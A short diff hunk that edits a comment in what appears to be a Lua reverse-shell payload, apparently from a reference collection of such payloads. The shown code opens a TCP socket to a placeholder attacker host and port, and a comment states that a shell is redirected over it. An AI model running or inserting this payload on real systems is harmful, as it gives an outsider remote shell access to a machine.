@@ -1,6 +1,6 @@
 socket = require("socket")
 
--- Open a new socket and connect to the attacker, the socket is associated with file descriptor 3 automatically
+-- Open a new TCP socket and connect to the attacker, the socket is associated with file descriptor 3 automatically
 socket.tcp():connect("*\host*", *\port*)
 
 -- Run the shell with redirected standard input/output/error to the socket
